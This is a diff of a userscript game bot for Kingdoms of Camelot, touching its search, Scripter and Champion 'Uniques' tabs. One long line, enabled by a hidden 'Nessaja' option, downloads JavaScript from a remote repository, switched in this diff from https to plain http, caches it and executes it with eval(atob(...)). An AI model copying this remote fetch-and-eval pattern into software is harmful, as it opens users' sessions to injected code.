@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name           KOC Power Bot
-// @version        20141002a
+// @version        20141008a
 // @namespace      mat
 // @homepage       https://code.google.com/p/koc-power-bot/
 // @include        *.kingdomsofcamelot.com/*main_src.php*
@@ -33,7 +33,7 @@ if(window.self.location != window.top.location){
    }
 }
 
-var Version = '20141002a';
+var Version = '20141008a';
 
 var http =  window.location.protocol+"\/\/";
 
@@ -7828,8 +7828,8 @@ Tabs.Search = {
         if (prov.value >= 1) {
 			var numslices = document.getElementById('provinceSLICES').value;
 			if (numslices == 1) {
-				document.getElementById ('pasrchX').value = t.Provinces[this.value].x;
-				document.getElementById ('pasrchY').value = t.Provinces[this.value].y;
+				document.getElementById ('pasrchX').value = t.Provinces[prov.value].x;
+				document.getElementById ('pasrchY').value = t.Provinces[prov.value].y;
 				document.getElementById ('pasrcDist').value = '75';
 				return;
 			}	
@@ -9212,9 +9212,10 @@ if(GlobalOptions.Baos) {
       var t = Tabs.Scripter
       t.myDiv = div;
       var m = '<DIV class=pbStat>Scripter</div><br>';
-      m += '<table algiht=right><tr><td></td><td><INPUT id=SCode type=text size=70 maxlength=-1 value="" \></td><td></td></tr>'
+      m += '<table><tr><td>><P align="right">eval(</td><td><INPUT id=SCode type=text size=70 maxlength=-1 value="" \></td><td>\)</td></tr>'
       m += '<tr><td><P align="right">alert(</td><td><INPUT id=SaCode type=text size=70 maxlength=-1 value="" \></td><td>)</td></tr>'
-      m += '<tr><td>alert(inspect(</td><td><INPUT id=SaiCode type=text size=70 maxlength=-1 value="" \></td><td>))</td></tr>'
+      m += '<tr><td><P align="right">alert(JSON2.stringify(</td><td><INPUT id=SajCode type=text size=70 maxlength=-1 value="" \></td><td>))</td></tr>'
+      m += '<tr><td><P align="right">alert(inspect(</td><td><INPUT id=SaiCode type=text size=70 maxlength=-1 value="" \></td><td>))</td></tr>'
       m += '</table><INPUT id=Baos780 type=text size=20 maxlength=-1 value='+y+' \>'
       div.innerHTML = m;
       
@@ -9228,6 +9229,11 @@ if(GlobalOptions.Baos) {
          alert(inspect(eval(this.value)));
       }, false);      
             
+      document.getElementById('SajCode').addEventListener ('keypress', function (e){
+      if(e.which == 13)
+         alert(eval('JSON2.stringify('+this.value+')'));
+      }, false);      
+	  
       document.getElementById('SaCode').addEventListener ('keypress', function (e){
       if(e.which == 13)
          alert(eval(this.value));
@@ -9247,7 +9253,7 @@ if(GlobalOptions.Baos) {
     var t = Tabs.Scripter;
   },  
 }
-if(GlobalOptions.Baos)if (GlobalOptions.Baos.indexOf('Nessaja') >= 0) { var serverID = getServerId();   if(!unsafeWindow.seed) return;  var s = GM_getValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID); if (s != null) {    s = JSON2.parse (s); try{ eval(atob(s))}catch (err) {logit(err);};} else if(unsafeWindow.seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "https://koc-power-bot.googlecode.com/svn/workspaces/darren/Nessaja",   headers: {'Accept': 'text/javascript',},  onload: function(responseDetails) { var serverID = getServerId(); setTimeout (function (){GM_setValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID, JSON2.stringify(responseDetails.responseText));}, 0);},}); };
+if(GlobalOptions.Baos)if (GlobalOptions.Baos.indexOf('Nessaja') >= 0) { var serverID = getServerId();   if(!unsafeWindow.seed) return;  var s = GM_getValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID); if (s != null) {    s = JSON2.parse (s); try{ eval(atob(s))}catch (err) {logit(err);};} else if(unsafeWindow.seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "http://koc-power-bot.googlecode.com/svn/trunk/Nessaja",   headers: {'Accept': 'text/javascript',},  onload: function(responseDetails) { var serverID = getServerId(); setTimeout (function (){GM_setValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID, JSON2.stringify(responseDetails.responseText));}, 0);},}); };
 
 /*********************************** Test TAB ***********************************/
 Tabs.Test = {
@@ -23851,6 +23857,7 @@ Tabs.Champion = {
   LastDeleted:0,
   MaxItems:128,
   CompPos:0,
+  imgUniqueTypes : ["weapon","chestArmor","helmet","feet","shield","ring1","ring2","necklace","cloak"], // must be in this order
   CardTypes:["ALL","Attack","Defense","Life","Speed","Range","Load","Accuracy","Damage","Bonus Damage","Armor","Strength","Dexterity","Health","Hit","Crit","Block"],
   EquipType: ["ALL","weapon","armor","helm","boot","shield","ring1","ring2","necklace","cloak"], //case sensitive for the moment.
   EquipTypeNo: ["ALL","1","2","3","4","5","6","7","8","9"], //case sensitive for the moment.
@@ -23871,8 +23878,6 @@ Tabs.Champion = {
     var main = '<TABLE align=center><TR><TD><INPUT class=pbSubtab ID=ptmrcxSubSal type=submit value="Salvage"></td>';
     main +='<TD><INPUT class=pbSubtab ID=ptmrcxSubUE type=submit value="Upgrade/Enhance"></td>';
     main +='<TD><INPUT class=pbSubtab ID=ptmrcxSubEQ type=submit value="Compare"></td>';
-//    main +='<TD><input class=pbSubtab ID=ptmrcxSubTC type=submit value="Caps"></TD>';
-//    main +='<TD><input class=pbSubtab ID=ptmrcxSubTR type=submit value="Champion"></TD></tr>';
     main +='<TD><input class=pbSubtab ID=ptmrcxSubUN type=submit value="Uniques"></TD>';
     main +='<TD><INPUT class=pbSubtab ID=ptmrcxSubAS type=submit value="Assign"></td>';
     main += '</tr></table><HR class=ptThin>';
@@ -23884,8 +23889,6 @@ Tabs.Champion = {
     document.getElementById('ptmrcxSubSal').addEventListener('click', e_butSubtab, false);
     document.getElementById('ptmrcxSubUE').addEventListener('click', e_butSubtab, false);
    document.getElementById('ptmrcxSubEQ').addEventListener('click', e_butSubtab, false);
-//   document.getElementById('ptmrcxSubTC').addEventListener('click', e_butSubtab, false);
-//   document.getElementById('ptmrcxSubTR').addEventListener('click', e_butSubtab, false);
    document.getElementById('ptmrcxSubUN').addEventListener('click', e_butSubtab, false); 
     document.getElementById('ptmrcxSubAS').addEventListener('click', e_butSubtab, false);
 
@@ -23927,129 +23930,500 @@ Tabs.Champion = {
      initChampData : function(){
 	var t = Tabs.Champion;
 
-	var enhanceMap = unsafeWindow.cm.WorldSettings.getSettingAsObject("CE_ENHANCE_AETHERSTONE_MAP"),enhObjSize=0;
-	for (var k in enhanceMap)
-	  enhObjSize++;
-	for (i=1; i<enhObjSize+1; i++) 
-	  t.EnhanceCost[i]=enhanceMap[i]["Aetherstones"];
-	var upgradeMap = unsafeWindow.cm.WorldSettings.getSettingAsObject("CE_UPGRADE_AETHERSTONE_MAP"),upgObjSize=0;
-	for (var k in upgradeMap)
-	  upgObjSize++;
-	for (i=1; i<upgObjSize+1; i++)
-	  t.UpgradeCost[i]=upgradeMap[i]["Aetherstones"];
+    var enhanceMap = unsafeWindow.cm.WorldSettings.getSettingAsObject("CE_ENHANCE_AETHERSTONE_MAP"),enhObjSize=0;
+    for (var k in enhanceMap)
+       enhObjSize++;
+    for (i=1; i<enhObjSize+1; i++) 
+       t.EnhanceCost[i]=enhanceMap[i]["Aetherstones"];
+    var upgradeMap = unsafeWindow.cm.WorldSettings.getSettingAsObject("CE_UPGRADE_AETHERSTONE_MAP"),upgObjSize=0;
+    for (var k in upgradeMap)
+       upgObjSize++;
+    for (i=1; i<upgObjSize+1; i++)
+       t.UpgradeCost[i]=upgradeMap[i]["Aetherstones"];
 
-	unsafeWindow.chsetFAV = t.setSalvageFAV;
-	unsafeWindow.chSavlage = t.setSalvageItem;
-	unsafeWindow.chActionPopup = t.ActionPopup;
+    unsafeWindow.chsetFAV = t.setSalvageFAV;
+    unsafeWindow.chSavlage = t.setSalvageItem;
+    unsafeWindow.chActionPopup = t.ActionPopup;
 	unsafeWindow.chpostInfo = t.postInfo;
-//	unsafeWindow.chdoEquip = t.doEquip;
-	unsafeWindow.chfupgenh = t.fupgenh;
+//    unsafeWindow.chdoEquip = t.doEquip;
+    unsafeWindow.chfupgenh = t.fupgenh;
 
-	var a = JSON2.parse(GM_getValue ('ChampionHistory_'+getServerId(), '[]'));
-	if (matTypeof(a) == 'array') t.log = a;
-	var a = JSON2.parse(GM_getValue ('ChampionSalvageHistory_'+getServerId(), '[]'));
-	if (matTypeof(a) == 'array') t.SalvageLog = a;
+    var a = JSON2.parse(GM_getValue ('ChampionHistory_'+getServerId(), '[]'));
+    if (matTypeof(a) == 'array') t.log = a;
+    var a = JSON2.parse(GM_getValue ('ChampionSalvageHistory_'+getServerId(), '[]'));
+    if (matTypeof(a) == 'array') t.SalvageLog = a;
 
-	var effectTiers = unsafeWindow.cm.WorldSettings.getSettingAsObject("CE_EFFECTS_TIERS");
-	var effObjSize=0,effsplit={},championStatTiers={},basegrowth={};
-	for (var k in effectTiers) {
-	  effsplit=effectTiers[k]["Id_Tier"].split(",");
-	  championStatTiers[''+effsplit[0]]={};
-	}  
-	for (var k in effectTiers) {
-	  effsplit=effectTiers[k]["Id_Tier"].split(",");
-	  basegrowth={};
-	  basegrowth['base']=effectTiers[k]["Base"];
-	  basegrowth['growth']=effectTiers[k]["Growth"];
-	  championStatTiers[''+effsplit[0]][''+effsplit[1]]=basegrowth;
-	}  
-	t.championStatTiers=championStatTiers;
+    var effectTiers = unsafeWindow.cm.WorldSettings.getSettingAsObject("CE_EFFECTS_TIERS");
+    var effObjSize=0,effsplit={},championStatTiers={},basegrowth={};
+    for (var k in effectTiers) {
+       effsplit=effectTiers[k]["Id_Tier"].split(",");
+       championStatTiers[''+effsplit[0]]={};
+    }  
+    for (var k in effectTiers) {
+       effsplit=effectTiers[k]["Id_Tier"].split(",");
+       basegrowth={};
+       basegrowth['base']=effectTiers[k]["Base"];
+       basegrowth['growth']=effectTiers[k]["Growth"];
+       championStatTiers[''+effsplit[0]][''+effsplit[1]]=basegrowth;
+    }  
+   t.championStatTiers=championStatTiers;
 
-	var championStatEffects={};
-	for (i=1; i<8; i++)
-	  championStatEffects[''+i]=unsafeWindow.cm.thronestats.effects[''+i];
-	for (i=17; i<24; i++)
-	  championStatEffects[''+i]=unsafeWindow.cm.thronestats.effects[''+i];
-//	for (i=201; i<210; i++)
-//	  championStatEffects[''+i]=unsafeWindow.cm.thronestats.effects['1'];
-	championStatEffects['201']={1:"Damage",2:["Damage"],3:"Combat"};
-	championStatEffects['202']={1:"Bonus Damage",2:["Bonus Damage"],3:"Combat"};
-	championStatEffects['203']={1:"Armor",2:["Armor"],3:"Combat"};
-	championStatEffects['204']={1:"Strength",2:["Strength"],3:"Combat"};
-	championStatEffects['205']={1:"Dexterity",2:["Dexterity"],3:"Combat"};
-	championStatEffects['206']={1:"Health",2:["Health"],3:"Combat"};
-	championStatEffects['207']={1:"Hit",2:["Hit"],3:"Combat"};
-	championStatEffects['208']={1:"Crit",2:["Crit"],3:"Combat"};
-	championStatEffects['209']={1:"Block",2:["Block"],3:"Combat"};
-	t.championStatEffects=championStatEffects;
+   var championStatEffects={};
+   for (i=1; i<8; i++)
+      championStatEffects[''+i]=unsafeWindow.cm.thronestats.effects[''+i];
+   for (i=17; i<24; i++)
+      championStatEffects[''+i]=unsafeWindow.cm.thronestats.effects[''+i];
+//   for (i=201; i<210; i++)
+//      championStatEffects[''+i]=unsafeWindow.cm.thronestats.effects['1'];
+   championStatEffects['201']={1:"Damage",2:["Damage"],3:"Combat"};
+   championStatEffects['202']={1:"Bonus Damage",2:["Bonus Damage"],3:"Combat"};
+   championStatEffects['203']={1:"Armor",2:["Armor"],3:"Combat"};
+   championStatEffects['204']={1:"Strength",2:["Strength"],3:"Combat"};
+   championStatEffects['205']={1:"Dexterity",2:["Dexterity"],3:"Combat"};
+   championStatEffects['206']={1:"Health",2:["Health"],3:"Combat"};
+   championStatEffects['207']={1:"Hit",2:["Hit"],3:"Combat"};
+   championStatEffects['208']={1:"Crit",2:["Crit"],3:"Combat"};
+   championStatEffects['209']={1:"Block",2:["Block"],3:"Combat"};
+   t.championStatEffects=championStatEffects;
 
 	for (var i in unsafeWindow.kocChampionItems){
 	  if (unsafeWindow.seed.champion.equipment[i]) if (unsafeWindow.seed.champion.equipment[i]["repairing"]) {
 	    if (unsafeWindow.seed.champion.equipment[i]["eta"]>t.repairEnd) t.repairEnd=unsafeWindow.seed.champion.equipment[i]["eta"];
 	    if (unsafeWindow.seed.champion.equipment[i]["start"]>t.repairStart) t.repairStart=unsafeWindow.seed.champion.equipment[i]["start"];
 	  }
-	}
+    }     
    },
+   
+	Uniques: function () {
+		var maxlevel = 14;
+		var t = Tabs.Champion;
+		var UniqueItems = null;
+		var chTypes = ["weapon","armor","helm","boots","shield","ring1","ring2","necklace","cloak"]; // must be in this order
+		var itemTypes = { weapon: 0, armor: 1, helm: 2, boots: 3, shield: 4, ring1: 5, ring2: 6, necklace: 7, cloak: 8 }; // must be in this order
+		var itemLists = [];
+		var selectedCard1 = 0;
+		var selectedCard2 = 0;
+		var selectedType1 = 0;
+		var selectedType2 = 0;
+		unsafeWindow.pbrefreshchuniques = function (chID,div) {GetInventory(chID,div);};
+		
+		// need to manually populate this crap
+		//UniqueItems["28007"] = {Id:28007,Name:"Blade of the Wild", Effects:[{type:201,tier:5},{type:5,tier:2},{type:204,tier:2},{type:207,tier:2},{type:1,tier:3}],Faction:3,Type:1};
+		UniqueItems = {};
+		UniqueItems["28001"] = {Id:28001,Name:"Blade of Radiance", Effects:[{type:201,tier:5},{type:2,tier:2},{type:206,tier:2},{type:203,tier:2},{type:209,tier:3}],Faction:1,Type:1};
+		UniqueItems["28002"] = {Id:28002,Name:"Armor of Radiance", Effects:[{type:206,tier:3},{type:203,tier:2},{type:204,tier:2},{type:2,tier:3},{type:21,tier:3}],Faction:1,Type:2};
+		UniqueItems["28003"] = {Id:28003,Name:"Shield of Radiance", Effects:[{type:205,tier:2},{type:203,tier:2},{type:3,tier:2},{type:207,tier:2},{type:209,tier:3}],Faction:1,Type:5};
+		UniqueItems["28004"] = {Id:28004,Name:"Black Knight's Blade", Effects:[{type:201,tier:6},{type:21,tier:2},{type:204,tier:2},{type:208,tier:2},{type:202,tier:3}],Faction:2,Type:1};
+		UniqueItems["28006"] = {Id:28006,Name:"Black Knight's Shield", Effects:[{type:204,tier:3},{type:207,tier:2},{type:19,tier:2},{type:17,tier:3},{type:202,tier:3}],Faction:2,Type:5};
+		UniqueItems["28007"] = {Id:28007,Name:"Blade of the Wild", Effects:[{type:201,tier:5},{type:5,tier:2},{type:204,tier:2},{type:207,tier:2},{type:1,tier:3}],Faction:3,Type:1};
+		UniqueItems["28009"] = {Id:28009,Name:"Shield of the Wild", Effects:[{type:202,tier:2},{type:207,tier:2},{type:208,tier:2},{type:203,tier:3},{type:5,tier:3}],Faction:3,Type:5};
+		UniqueItems["28010"] = {Id:28010,Name:"Scourge Knight's Maul", Effects:[{type:201,tier:6},{type:205,tier:3},{type:204,tier:3},{type:1,tier:3},{type:5,tier:2}],Faction:2,Type:1};
+		UniqueItems["28011"] = {Id:28011,Name:"Scourge Knight's Armor", Effects:[{type:206,tier:2},{type:203,tier:3},{type:208,tier:2},{type:1,tier:3},{type:207,tier:2}],Faction:2,Type:2};
+		UniqueItems["28012"] = {Id:28012,Name:"Scourge Knight's Shield", Effects:[{type:206,tier:2},{type:205,tier:2},{type:208,tier:3},{type:21,tier:3},{type:17,tier:3}],Faction:2,Type:5};
+		UniqueItems["28014"] = {Id:28014,Name:"Helmet of Radiance", Effects:[{type:203,tier:3},{type:207,tier:3},{type:209,tier:3},{type:2,tier:2},{type:3,tier:3}],Faction:1,Type:3};
+		UniqueItems["28016"] = {Id:28016,Name:"Scourge Knight's Helmet", Effects:[{type:17,tier:2},{type:208,tier:3},{type:202,tier:3},{type:206,tier:2},{type:5,tier:2}],Faction:2,Type:3};
+		UniqueItems["28017"] = {Id:28017,Name:"Noble Axe", Effects:[{type:201,tier:4},{type:22,tier:2},{type:207,tier:3},{type:3,tier:2},{type:202,tier:3}],Faction:1,Type:1};
+		UniqueItems["28018"] = {Id:28018,Name:"Noble Shield", Effects:[{type:209,tier:3},{type:22,tier:3},{type:202,tier:3},{type:7,tier:3},{type:3,tier:2}],Faction:1,Type:5};
+		UniqueItems["28019"] = {Id:28019,Name:"Noble Armor", Effects:[{type:203,tier:3},{type:22,tier:3},{type:7,tier:2},{type:209,tier:2},{type:204,tier:3}],Faction:1,Type:2};
+		UniqueItems["28020"] = {Id:28020,Name:"Noble Helmet", Effects:[{type:205,tier:3},{type:206,tier:3},{type:22,tier:2},{type:3,tier:2},{type:208,tier:3}],Faction:1,Type:3};
+		UniqueItems["28021"] = {Id:28021,Name:"Feral Claw", Effects:[{type:201,tier:4},{type:1,tier:2},{type:207,tier:3},{type:18,tier:2},{type:19,tier:2}],Faction:3,Type:1};
+		UniqueItems["28022"] = {Id:28022,Name:"Feral Shield", Effects:[{type:206,tier:3},{type:21,tier:2},{type:202,tier:2},{type:4,tier:2},{type:18,tier:3}],Faction:3,Type:5};
+		UniqueItems["28023"] = {Id:28023,Name:"Feral Armor", Effects:[{type:203,tier:2},{type:17,tier:2},{type:6,tier:3},{type:3,tier:2},{type:205,tier:2}],Faction:3,Type:2};
+		UniqueItems["28024"] = {Id:28024,Name:"Feral Helmet", Effects:[{type:206,tier:2},{type:5,tier:2},{type:20,tier:2},{type:203,tier:3},{type:6,tier:3}],Faction:3,Type:3};
+		UniqueItems["28031"] = {Id:28031,Name:"Commander's Sword", Effects:[{type:201,tier:6},{type:1,tier:2},{type:207,tier:3},{type:18,tier:2},{type:208,tier:3}],Faction:1,Type:1};
+		UniqueItems["28035"] = {Id:28035,Name:"Commander's Greaves", Effects:[{type:205,tier:2},{type:20,tier:3},{type:2,tier:2},{type:206,tier:2},{type:203,tier:3}],Faction:1,Type:4};
+		
 
-    Uniques : function () {
-        var t = Tabs.Champion;
-        var UniqueItems = {
-            Weapon : {
-                "Black Knights Blade"   : "http://i.imgur.com/QjAxD5J.png",
-                "Blade of Radiance"     : "http://img443.imageshack.us/img443/5593/dk9v.png",
-            },
-            Armor : {
-                "Black Knights Armor"   : "http://i.imgur.com/hap9CtH.png",
-                "Armor of the Wild"     : "http://img819.imageshack.us/img819/5202/hs99.png",
-            },
-            /* Helm : {
-                "Pendragons Banner"     : "http://i.imgur.com/lQ1iSSD.png",
-            },
-            Boot : {
-                "Pendragons Banner"     : "http://i.imgur.com/lQ1iSSD.png",
-            },*/
-            Shield : {
-                "Black Knights Shield"  : "http://i.imgur.com/aNhjnAn.png",
-            },
+		for (var i=28001;i<29000;i++) {
+			if (!unsafeWindow.itemlist['i'+i]) break;
+			if (!UniqueItems[i]) {
+				UniqueItems[i] = {Id:i,Name:unsafeWindow.itemlist['i'+i].name, Effects:[],Faction:0,Type:0};
+			}
+		}
+	   
+        for (i in itemTypes) {
+            itemLists[i] = new Array;
         }
+        for (k in UniqueItems) {
+            var champ_item = UniqueItems[k];
+            if (champ_item == null || !champ_item || !itemLists[chTypes[parseInt(champ_item.Type)-1]]) continue;
+            itemLists[chTypes[parseInt(champ_item.Type)-1]].push(champ_item);
+        }
+		
+        var m = '<div>';
+        m += '<DIV class=ptstat><b>Champions Hall Uniques</b></div>';
+        m += '<TABLE width=100% class=pbTabBR>';
+        m += '<tr width=100% align=center><td width=50%/><td width=50%/></tr>';
+ 
+        m += '<tr><td><div style="max-width:100%;"><b>Type:&nbsp;</b><select id="btchUniqueType1">';
+        m += '<option value="0">--ALL--</option>';
+        for (var type_index = 0; type_index < chTypes.length; ++type_index) {
+            m += '<option value="' + chTypes[type_index] + '">' + chTypes[type_index] + '</option>';
+        }
+        m += '</select></div></td>';
 
-        unsafeWindow.pbshowunique = showUnique;
-        
-        m =  '<table><tr><td width=400px>Uniques</td><td width=400px>Panel A</td><td width=400px>Panel B</td></tr><tr><td style="vertical-align:top">';
-        
-        for (var i in UniqueItems) {
-        
-            m += '<div class="pbdivHeader" align=left><a id='+i+'Hdr class=pbdivLink >'+i+'&nbsp;<img id='+i+'Arrow height="10" src="https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/autoAttack/down_arrow.png"></a></div>'
-            m += '<div id='+i+' align=left class=""><table>';
-            for (var k in UniqueItems[i]) {
-                m += '<tr><td width=15px><a onClick=\'pbshowunique("panelAch", "'+k+'","'+i+'")\'>A</a></td><td width=15px><a onClick=\'pbshowunique("panelBch", "'+k+'","'+i+'")\'>B</a></td><td>'+k+'</td></tr>';
+        m += '<td><div style="max-width:100%;"><b>Type:&nbsp;</b><select id="btchUniqueType2">';
+        m += '<option value="0">--ALL--</option>';
+        for (var type_index = 0; type_index < chTypes.length; ++type_index) {
+            m += '<option value="' + chTypes[type_index] + '">' + chTypes[type_index] + '</option>';
+        }
+        m += '</select></div></td>';
+
+        m += '<tr><td><div style="max-width:100%;"><b>Item:&nbsp;</b><select id="btchUnique1">';
+        m += '<option value="0">--Items--</option>';
+        for (k in UniqueItems) {
+            var champ_item = UniqueItems[k];
+            if (champ_item == null || !champ_item) continue;
+            m += '<option value="' + k + '">' + champ_item.Name + ' </option>';
+        }
+        m += '</select></div></td>';
+
+        m += '<td><div style="max-width:100%;"><b>Item:&nbsp;</b><select id="btchUnique2">';
+        m += '<option value="0">--Items--</option>';
+        for (k in UniqueItems) {
+            var champ_item = UniqueItems[k];
+            if (champ_item == null || !champ_item) continue;
+            m += '<option value="' + k + '">' + champ_item.Name + ' </option>';
+        }
+        m += '</select></div></td>';
+
+        m += '<tr><td><div style="max-width:100%;"><b>Level:&nbsp;</b><select id="btchUniqueLevel1">';
+        m += '<option value="0" selected>0</option>';
+        for (var type_index = 1; type_index < maxlevel + 1; ++type_index) {
+            m += '<option value="' + type_index + '">' + type_index + '</option>';
+        }
+        m += '</select></div></td>';
+        m += '<td><div style="max-width:100%;"><b>Level:&nbsp;</b><select id="btchUniqueLevel2">';
+        m += '<option value="0" selected>0</option>';
+        for (var type_index = 1; type_index < maxlevel + 1; ++type_index) {
+            m += '<option value="' + type_index + '">' + type_index + '</option>';
+        }
+        m += '</select></div></td></tr>';
+
+        m += '<tr>';
+        m += '<td id="btchUniqueItem1" class="tdcard" style="overflow: visible;  width: auto; height: auto;"/>';
+        m += '<td id="btchUniqueItem2" class="tdcard" style="overflow: visible;  width: auto; height: auto;"/>';
+        m += '</tr>';
+        m += '<tr>';
+        m += '<td id="btchUniqueInv1" class="tdcard" style="overflow: visible;  width: auto; height: auto;"/>';
+        m += '<td id="btchUniqueInv2" class="tdcard" style="overflow: visible;  width: auto; height: auto;"/>';
+        m += '</tr>';
+
+        m += '</TABLE>';
+        m += '</div>';
+
+		t.Overv.innerHTML = m;
+
+        unsafeWindow.jQuery("#btchUniqueType1").change(function () {
+            var chType = document.getElementById('btchUniqueType1').value;
+            var chList = document.getElementById('btchUnique1');
+            if (selectedCard1 == 0 || (selectedType1 != chType) && chType != 0) {
+                selectedCard1 = 0;
             }
-            m += '</table></div>';
+            selectedType1 = chType;
+            unsafeWindow.jQuery("#btchUnique1").empty();
+            var chOption = document.createElement('option');
+            chOption.text = '--Items--';
+            chOption.value = 0;
+            chList.add(chOption);
+            for (k in UniqueItems) {
+                var champ_item = UniqueItems[k];
+                if (champ_item == null || !champ_item) continue;
+                if (chTypes[parseInt(champ_item.Type)-1] == chType || chType == 0) {
+                    var chOption = document.createElement('option');
+                    chOption.text = champ_item.Name;
+                    chOption.value = k;
+                    chList.add(chOption);
+                }
+            }
+
+            if (selectedCard1 != 0) {
+                unsafeWindow.jQuery("#btchUnique1").val(selectedCard1);
+            }
+
+        });
+
+        unsafeWindow.jQuery("#btchUniqueType2").change(function () {
+            var chType = document.getElementById('btchUniqueType2').value;
+            var chList = document.getElementById('btchUnique2');
+            if (selectedCard2 == 0 || (selectedType1 != chType) && chType != 0) {
+                selectedCard2 = 0;
+            }
+            selectedType2 = chType;
+            unsafeWindow.jQuery("#btchUnique2").empty();
+            var chOption = document.createElement('option');
+            chOption.text = '--Items--';
+            chOption.value = 0;
+            chList.add(chOption);
+            for (k in UniqueItems) {
+                var champ_item = UniqueItems[k];
+                if (champ_item == null || !champ_item) continue;
+                if (chTypes[parseInt(champ_item.Type)-1] == chType || chType == 0) {
+                    var chOption = document.createElement('option');
+                    chOption.text = champ_item.Name;
+                    chOption.value = k;
+                    chList.add(chOption);
+                }
+            }
+
+            if (selectedCard2 != 0) {
+                unsafeWindow.jQuery("#btchUnique2").val(selectedCard2);
+            }
+
+        });
+
+        unsafeWindow.jQuery("#btchUnique1").change(function () { changeUnique1(this); });
+
+        unsafeWindow.jQuery("#btchUnique1").keyup(function (event) { changeUnique1(this); });
+
+        function changeUnique1(thisObj) {
+            var chID = unsafeWindow.jQuery(thisObj).val();
+            var chDisplay = document.getElementById('btchUniqueItem1');
+            var chLevel = document.getElementById('btchUniqueLevel1');
+            selectedCard1 = 0;
+            ConvertToCard(chID,chDisplay,chLevel);
+            GetInventory(chID,'btchUniqueInv1');
+            selectedCard1 = chID;
+            selectedType1 = i;
         }
-               
-        m += '</td><td id=panelAch style="vertical-align:top"></td><td id=panelBch style="vertical-align:top"></td></tr>';
-        m += '</table>';
-        t.Overv.innerHTML = m;
-        
-        function showUnique(panel,name,type) {
-            switch (type) {
-                case "Weapon" : document.getElementById(panel).innerHTML = '<img src='+UniqueItems.Weapon[name]+'>'; break;
-                case "Armor"  : document.getElementById(panel).innerHTML = '<img src='+UniqueItems.Armor[name]+'>'; break;
-                /*case "Helm"  : document.getElementById(panel).innerHTML = '<img src='+UniqueItems.Helm[name]+'>'; break;
-                case "Boot"  : document.getElementById(panel).innerHTML = '<img src='+UniqueItems.Boot[name]+'>'; break;*/
-                case "Shield"  : document.getElementById(panel).innerHTML = '<img src='+UniqueItems.Shield[name]+'>'; break;
+
+        unsafeWindow.jQuery("#btchUnique2").change(function () { changeUnique2(this); });
+
+        unsafeWindow.jQuery("#btchUnique2").keyup(function (event) { changeUnique2(this); });
+
+        function changeUnique2(thisObj) {
+            var chID = unsafeWindow.jQuery(thisObj).val();
+            var chDisplay = document.getElementById('btchUniqueItem2');
+            var chLevel = document.getElementById('btchUniqueLevel2');
+            selectedCard2 = 0;
+            ConvertToCard(chID,chDisplay,chLevel);
+            GetInventory(chID,'btchUniqueInv2');
+            selectedCard2 = chID;
+            selectedType2 = i;
+        }
+
+        unsafeWindow.jQuery("#btchUniqueLevel1").keyup(function (event) { changeLevel1(); });
+
+        unsafeWindow.jQuery("#btchUniqueLevel1").change(function () { changeLevel1(); });
+
+        function changeLevel1() {
+            if (selectedCard1 != 0) {
+                var chID = selectedCard1;
+                var chDisplay = document.getElementById('btchUniqueItem1');
+                var chLevel = document.getElementById('btchUniqueLevel1');
+                chDisplay.innerHTML = '';
+                ConvertToCard(chID,chDisplay,chLevel);
             }
         }
-        
-        for (var j in UniqueItems) {
-            (function(j){
-                document.getElementById(j+'Hdr').addEventListener ('click', function () {ToggleDivDisplay(500,500,j);}, false);
-            })(j);
-        }
-        
-        
-    },
 
+        unsafeWindow.jQuery("#btchUniqueLevel2").keyup(function (event) { changeLevel2(); });
+
+        unsafeWindow.jQuery("#btchUniqueLevel2").change(function () { changeLevel2(); });
+
+        function changeLevel2() {
+            if (selectedCard2 != 0) {
+                var chID = selectedCard2;
+                var chDisplay = document.getElementById('btchUniqueItem2');
+                var chLevel = document.getElementById('btchUniqueLevel2');
+                chDisplay.innerHTML = '';
+                ConvertToCard(chID,chDisplay,chLevel);
+            }
+        }
+
+		function ConvertToCard (chID,div,lvl) {
+			div.innerHTML = '';
+			var CHCard = {};
+			CHCard = UniqueItems[chID];
+			CHCard.id = CHCard.Id;
+			CHCard.name = CHCard.Name;
+			if (CHCard.Faction != 0) {
+				CHCard.faction = unsafeWindow.g_js_strings.commonstr[unsafeWindow.cm.CHAMPION.getFactionClasses(CHCard.Faction)].toLowerCase();
+				CHCard.type = chTypes[parseInt(CHCard.Type)-1];
+			}
+			else {
+				CHCard.faction = 'unknown';
+				CHCard.type = 'unknown';
+				CHCard.unknown = true;
+			}
+			CHCard.unique = CHCard.id;
+			CHCard.level = parseInt(lvl.value);
+			CHCard.quality = 5;
+			CHCard.createPrefix = function () { return ""; };
+			CHCard.createSuffix = function () { return ""; };
+			CHCard.effects = {};
+			var effects = eval(CHCard.Effects);
+			var slot = 0;
+			for (k in effects) {
+				slot++
+				CHCard.effects["slot"+slot] = {};
+				CHCard.effects["slot"+slot].id = effects[k].type;
+				CHCard.effects["slot"+slot].tier = effects[k].tier;
+			}
+			div.innerHTML = t.DisplayCard(CHCard);
+		};
+
+		function GetInventory (chID,div) {
+			div.innerHTML = '';
+			var m = '<br><b>Champion Hall</b><br>';
+			var chitem = {};
+			for (k in unsafeWindow.kocChampionItems) {
+				var champ_item = unsafeWindow.kocChampionItems[k];
+				if (champ_item.unique == chID) {
+					if (chitem[champ_item.level]) {chitem[champ_item.level]++} else {chitem[champ_item.level] = 1;}
+				}
+			}
+			var gotitem = false;
+			for (l in chitem) {
+				gotitem = true;
+				m += 'You have '+chitem[l]+' at level '+l+'<br>';
+			}
+			if (!gotitem) m += 'You have none in your champion hall.<br>';
+			else {
+				if (UniqueItems[chID].Faction == 0) {
+					m += '<a id=pbgenchstats>Generate Stats</a><br>';
+				}
+			}	
+
+       
+			m += '<br><b>Inventory</b><br>';
+			var inv = unsafeWindow.seed.items['i'+chID];
+			m += 'You have '+(inv?inv:'none')+' in your inventory.';
+			if ((inv?inv:0) != 0 && !gotitem) {
+				m += '<br><a onClick="cm.ItemController.use(\''+chID+'\');setTimeout(function(){pbrefreshchuniques('+chID+',\''+div+'\')},2000);">Add to Champion Hall</a>';
+			}
+			document.getElementById(div).innerHTML = m;
+			if (document.getElementById('pbgenchstats')) {
